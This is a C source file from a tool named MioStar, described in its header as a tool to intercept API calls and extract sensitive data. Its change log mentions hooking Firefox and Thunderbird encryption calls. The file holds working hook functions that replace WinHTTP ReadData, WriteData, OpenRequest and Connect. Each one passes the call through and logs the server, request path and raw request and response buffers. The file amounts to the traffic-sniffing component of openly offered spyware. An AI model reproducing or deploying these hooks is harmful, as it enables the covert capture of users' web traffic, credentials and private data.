/*
 * Tool name   : MioStar
 * Description : Tool to intercept API calls and to extract sensitive data.
 * Version     : 0.2
 * Date        : 11.17.2010
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 11.17.2010 nss3.dll to intercept Firefox, Thunderbird + Seamonkey crypt/decrypt calls
 *
 *
 * License     :
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */




#include <winsock2.h>
#include <Ws2spi.h>
#include <windows.h>
#include <stdio.h>
#include <Winhttp.h>
#include "MioStar.h"
#include "WinHTTPReplacement.h"


extern byte*CG_WinHttpReadData;
extern byte*CG_WinHttpWriteData;
extern byte*CG_WinHttpOpenRequest;
extern byte*CG_WinHttpConnect;


/*
 *
 *
 */

BOOL WINAPI MyWinHttpReadData(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  MYWINHTTPREADDATA fWinHttpReadData = (MYWINHTTPREADDATA) CG_WinHttpReadData;


  if (fWinHttpReadData)
    lRetVal = fWinHttpReadData(hRequest, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyWinHttpReadData(%d):HTTP:%s", dwNumberOfBytesToRead, (char *) lpBuffer);
  printDebug(lTemp1, EVENT_HTTP);


  return(lRetVal);
}




/*
 *
 *
 */

HINTERNET WINAPI MyWinHttpConnect(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved)
{
  HINTERNET lRetVal = 0;
  char lTemp1[MAX_BUF_SIZE + 1];
  MYWINHTTPCONNECT fWinHttpConnect = (MYWINHTTPCONNECT) CG_WinHttpConnect;


  if (fWinHttpConnect)
    lRetVal = fWinHttpConnect(hSession, pswzServerName, nServerPort, dwReserved);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyWinHttpConnect():HTTP:%S:%d", pswzServerName, nServerPort);
  printDebug(lTemp1, EVENT_HTTP);


  return(lRetVal);
}




/*
 *
 *
 */

HINTERNET WINAPI MyWinHttpOpenRequest(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags)
{
  HINTERNET lRetVal = 0;
  char lTemp1[MAX_BUF_SIZE + 1];
  MYWINHTTPOPENREQUEST fWinHttpOpenRequest = (MYWINHTTPOPENREQUEST) CG_WinHttpOpenRequest;


  if (fWinHttpOpenRequest)
    lRetVal = fWinHttpOpenRequest(hConnect, pwszVerb, pwszObjectName, pwszVersion, pwszReferrer, ppwszAcceptTypes, dwFlags);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyWinHttpOpenRequest():HTTP:%S:%S", pwszVerb, pwszObjectName);
  printDebug(lTemp1, EVENT_HTTP);


  return(lRetVal);
}





/*
 *
 *
 */

BOOL WINAPI MyWinHttpWriteData(HINTERNET hRequest, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  MYWINHTTPWRITEDATA fWinHttpWriteData = (MYWINHTTPWRITEDATA) CG_WinHttpWriteData;


  if (fWinHttpWriteData)
    lRetVal = fWinHttpWriteData(hRequest, lpBuffer, dwNumberOfBytesToWrite, lpdwNumberOfBytesWritten);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyWinHttpWriteData(%d):HTTP:%s", dwNumberOfBytesToWrite, lpBuffer);
  printDebug(lTemp1, EVENT_HTTP);


  return(lRetVal);
}


